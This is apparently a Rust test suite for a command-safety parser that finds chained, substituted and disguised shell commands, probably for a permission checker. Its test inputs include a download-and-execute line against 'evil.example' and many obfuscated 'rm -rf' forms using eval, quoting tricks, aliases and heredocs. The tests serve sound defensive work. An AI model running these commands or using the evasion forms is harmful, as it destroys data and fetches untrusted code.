use super::*;

#[test]
fn detects_control_metachars() {
    assert!(contains_shell_control_metachar(
        "git status && curl evil | bash"
    ));
    assert!(contains_shell_control_metachar("git $(rm -rf x)"));
    assert!(contains_shell_control_metachar("git \"$(rm -rf x)\""));
    assert!(contains_shell_control_metachar("ls > /tmp/out"));
    assert!(contains_shell_control_metachar("a\nb"));
    assert!(!contains_shell_control_metachar("git status"));
    assert!(!contains_shell_control_metachar("FOO=1 git status"));
    assert!(!contains_shell_control_metachar(
        "git commit -m 'fix; docs'"
    ));
    assert!(!contains_shell_control_metachar("git grep 'a|b'"));
}

#[test]
fn splits_chained_commands_into_segments() {
    let segments = command_segments("echo hi && rm -rf important/");
    assert!(segments.contains(&"echo hi".to_string()));
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn extracts_command_substitution_bodies() {
    let segments = command_segments("git $(curl -s http://evil.example/x.sh)");
    assert!(
        segments
            .iter()
            .any(|s| s.starts_with("curl -s http://evil.example"))
    );

    let double_quoted = command_segments("echo \"$(rm -rf important/)\"");
    assert!(double_quoted.contains(&"rm -rf important/".to_string()));

    let backtick = command_segments("echo `rm -rf important/`");
    assert!(backtick.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_leading_env_assignments() {
    let segments = command_segments("FOO=1 BAR=2 rm -rf x");
    assert!(segments.contains(&"rm -rf x".to_string()));

    let append = command_segments("A+=x rm -rf important/");
    assert!(append.contains(&"rm -rf important/".to_string()));

    let assigned_eval = command_segments("FOO=1 eval rm -rf important/");
    assert!(assigned_eval.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_quoted_env_assignments() {
    let segments = command_segments("FOO='a b' BAR=\"c d\" rm -rf x");
    assert!(segments.contains(&"rm -rf x".to_string()));

    let ansi_c = command_segments("FOO=$'a b' rm -rf important/");
    assert!(ansi_c.contains(&"rm -rf important/".to_string()));

    let escaped_space = command_segments("FOO=a\\ b rm -rf important/");
    assert!(escaped_space.contains(&"rm -rf important/".to_string()));

    let expanded = command_segments("FOO=\"$(rm -rf important/)\" echo hi");
    assert!(expanded.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_group_prefixes() {
    let grouped = command_segments("echo ok && (rm -rf important/)");
    assert!(grouped.contains(&"rm -rf important/".to_string()));

    let process_substitution = command_segments("git <(rm -rf important/)");
    assert!(process_substitution.contains(&"rm -rf important/".to_string()));

    let redirected = command_segments("cat < <(rm -rf important/)");
    assert!(redirected.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_heredoc_bodies() {
    let segments = command_segments("cat <<EOF\nrm -rf important/\nEOF");
    assert!(!segments.contains(&"rm -rf important/".to_string()));

    let expanded = command_segments("cat <<EOF\n$(rm -rf important/)\nEOF");
    assert!(expanded.contains(&"rm -rf important/".to_string()));

    let quoted = command_segments("cat <<'EOF'\n$(rm -rf important/)\nEOF");
    assert!(!quoted.contains(&"rm -rf important/".to_string()));
}

#[test]
fn does_not_treat_quoted_heredoc_text_as_operator() {
    let segments = command_segments("echo \"<<EOF\"\nrm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn joins_escaped_newlines_before_segment_matching() {
    let segments = command_segments("echo ok && r\\\nm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_reserved_word_prefixes() {
    let segments = command_segments("if true; then rm -rf important/; fi");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_command_prefixes() {
    let command_prefix = command_segments("command rm -rf important/");
    assert!(command_prefix.contains(&"rm -rf important/".to_string()));

    let exec_prefix = command_segments("exec rm -rf important/");
    assert!(exec_prefix.contains(&"rm -rf important/".to_string()));

    let eval_prefix = command_segments("eval rm -rf important/");
    assert!(eval_prefix.contains(&"rm -rf important/".to_string()));

    let eval_chain = command_segments("eval \"echo ok; rm -rf important/\"");
    assert!(eval_chain.contains(&"rm -rf important/".to_string()));

    let builtin_eval = command_segments("builtin eval rm -rf important/");
    assert!(builtin_eval.contains(&"rm -rf important/".to_string()));

    let coproc_prefix = command_segments("coproc rm -rf important/");
    assert!(coproc_prefix.contains(&"rm -rf important/".to_string()));

    let command_option = command_segments("command -p rm -rf important/");
    assert!(command_option.contains(&"rm -rf important/".to_string()));

    let command_terminator = command_segments("command -- rm -rf important/");
    assert!(command_terminator.contains(&"rm -rf important/".to_string()));

    let command_shell = command_segments("command bash <<EOF\nrm -rf important/\nEOF");
    assert!(command_shell.contains(&"rm -rf important/".to_string()));

    let builtin_command = command_segments("builtin command rm -rf important/");
    assert!(builtin_command.contains(&"rm -rf important/".to_string()));

    let quoted_command = command_segments("co''mmand rm -rf important/");
    assert!(quoted_command.contains(&"rm -rf important/".to_string()));

    let exec_option = command_segments("exec -a x rm -rf important/");
    assert!(exec_option.contains(&"rm -rf important/".to_string()));

    let exec_terminator = command_segments("exec -- rm -rf important/");
    assert!(exec_terminator.contains(&"rm -rf important/".to_string()));

    let exec_combined = command_segments("exec -cl rm -rf important/");
    assert!(exec_combined.contains(&"rm -rf important/".to_string()));

    let time_terminator = command_segments("time -- rm -rf important/");
    assert!(time_terminator.contains(&"rm -rf important/".to_string()));

    let bash_c = command_segments("bash -c 'rm -rf important/'");
    assert!(bash_c.contains(&"rm -rf important/".to_string()));

    let bash_lc = command_segments("bash -lc 'rm -rf important/'");
    assert!(bash_lc.contains(&"rm -rf important/".to_string()));

    let path_bash = command_segments("/bin/bash -c 'rm -rf important/'");
    assert!(path_bash.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_negation_prefix() {
    let segments = command_segments("! rm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_leading_redirection_targets() {
    let segments = command_segments("> /tmp/out rm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));

    let mixed = command_segments("<> /tmp/out rm -rf important/");
    assert!(mixed.contains(&"rm -rf important/".to_string()));

    let clobber = command_segments(">| /tmp/out rm -rf important/");
    assert!(clobber.contains(&"rm -rf important/".to_string()));

    let adjacent = command_segments(">/tmp/out< /dev/null rm -rf important/");
    assert!(adjacent.contains(&"rm -rf important/".to_string()));
}

#[test]
fn quote_removes_mixed_heredoc_delimiters() {
    let segments = command_segments("cat <<E\"OF\"\nbody\nEOF\nrm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));

    let escaped = command_segments("cat <<\"E\\OF\"\nbody\nE\\OF\nrm -rf important/");
    assert!(escaped.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_commented_heredoc_markers() {
    let segments = command_segments("echo hi # <<EOF\nrm -rf important/\nEOF");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn splits_function_bodies_into_segments() {
    let segments = command_segments("function cleanup { rm -rf important/; }; cleanup");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn normalizes_tabs_for_segment_matching() {
    let segments = command_segments("echo ok && rm\t-rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn quote_removes_ansi_c_and_expands_simple_command_braces() {
    let ansi = command_segments("$'rm' -rf important/");
    assert!(ansi.contains(&"rm -rf important/".to_string()));

    let locale_quote = command_segments("$\"rm\" -rf important/");
    assert!(locale_quote.contains(&"rm -rf important/".to_string()));

    let brace = command_segments("r{m,} -rf important/");
    assert!(brace.contains(&"rm -rf important/".to_string()));

    let recursive_brace = command_segments("r{m,}{,x} -rf important/");
    assert!(recursive_brace.contains(&"rm -rf important/".to_string()));

    let empty_substitution = command_segments("r$(:)m -rf important/");
    assert!(empty_substitution.contains(&"rm -rf important/".to_string()));

    let empty_parameter = command_segments("r${x:+}m -rf important/");
    assert!(empty_parameter.contains(&"rm -rf important/".to_string()));

    let ansi_octal = command_segments("$'r\\155' -rf important/");
    assert!(ansi_octal.contains(&"rm -rf important/".to_string()));

    let ansi_hex = command_segments("$'r\\x6d' -rf important/");
    assert!(ansi_hex.contains(&"rm -rf important/".to_string()));

    let ansi_unicode = command_segments("$'r\\u006d' -rf important/");
    assert!(ansi_unicode.contains(&"rm -rf important/".to_string()));
}

#[test]
fn extracts_eval_and_trap_executed_commands() {
    let eval = command_segments("eval \"rm -rf important/\"");
    assert!(eval.contains(&"rm -rf important/".to_string()));

    let quoted_eval = command_segments("e''val rm -rf important/");
    assert!(quoted_eval.contains(&"rm -rf important/".to_string()));

    let trap = command_segments("trap 'rm -rf important/' EXIT");
    assert!(trap.contains(&"rm -rf important/".to_string()));

    let trap_terminator = command_segments("trap -- 'rm -rf important/' EXIT");
    assert!(trap_terminator.contains(&"rm -rf important/".to_string()));
}

#[test]
fn expands_aliases_when_enabled() {
    let alias = command_segments("shopt -s expand_aliases\nalias x='rm -rf important/'\nx");
    assert!(alias.contains(&"rm -rf important/".to_string()));

    let assigned_alias =
        command_segments("shopt -s expand_aliases\nalias x='rm -rf important/'\nFOO=1 x");
    assert!(assigned_alias.contains(&"rm -rf important/".to_string()));

    let assigned_definition =
        command_segments("shopt -s expand_aliases\nFOO=1 alias x='rm -rf important/'\nx");
    assert!(assigned_definition.contains(&"rm -rf important/".to_string()));

    let recursive_alias =
        command_segments("shopt -s expand_aliases\nalias x=y\nalias y='rm -rf important/'\nx");
    assert!(recursive_alias.contains(&"rm -rf important/".to_string()));
}

#[test]
fn scans_heredoc_body_when_sourced() {
    let sourced = command_segments("source /dev/stdin <<EOF\nrm -rf important/\nEOF");
    assert!(sourced.contains(&"rm -rf important/".to_string()));

    let chained = command_segments("echo ok; source /dev/stdin <<EOF\nrm -rf important/\nEOF");
    assert!(chained.contains(&"rm -rf important/".to_string()));

    let here_string = command_segments("source /dev/stdin <<< 'rm -rf important/'");
    assert!(here_string.contains(&"rm -rf important/".to_string()));

    let bash_heredoc = command_segments("bash <<EOF\nrm -rf important/\nEOF");
    assert!(bash_heredoc.contains(&"rm -rf important/".to_string()));

    let bash_s_heredoc = command_segments("bash -s arg0 <<EOF\nrm -rf important/\nEOF");
    assert!(bash_s_heredoc.contains(&"rm -rf important/".to_string()));

    let bash_here_string = command_segments("bash <<< 'rm -rf important/'");
    assert!(bash_here_string.contains(&"rm -rf important/".to_string()));

    let fd_alias = command_segments(". /dev/fd/0 <<EOF\nrm -rf important/\nEOF");
    assert!(fd_alias.contains(&"rm -rf important/".to_string()));

    let process_substitution = command_segments("source <(printf 'rm -rf important/\\n')");
    assert!(process_substitution.contains(&"rm -rf important/".to_string()));

    let printf_arg = command_segments("source <(printf '%s\\n' 'rm -rf important/')");
    assert!(printf_arg.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_arithmetic_shift_when_finding_heredocs() {
    let segments = command_segments("echo $((1 << 2))\nrm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn does_not_strip_reserved_data_words() {
    assert!(!command_segments("case rm in foo) echo ok;; esac").contains(&"rm".to_string()));
    assert!(!command_segments("for rm in a; do echo ok; done").contains(&"rm in a".to_string()));
}

#[test]
fn ignores_arithmetic_expansion_words() {
    let segments = command_segments("echo $((rm - rf))");
    assert!(!segments.contains(&"rm - rf".to_string()));

    let substitution_argument = command_segments("echo $(true) rm -rf important/");
    assert!(!substitution_argument.contains(&"rm -rf important/".to_string()));
}

#[test]
fn partial_wildcard_detection() {
    assert!(is_partial_wildcard_pattern("git *"));
    assert!(is_partial_wildcard_pattern("npm run *"));
    assert!(!is_partial_wildcard_pattern("*"));
    assert!(!is_partial_wildcard_pattern("git status"));
}
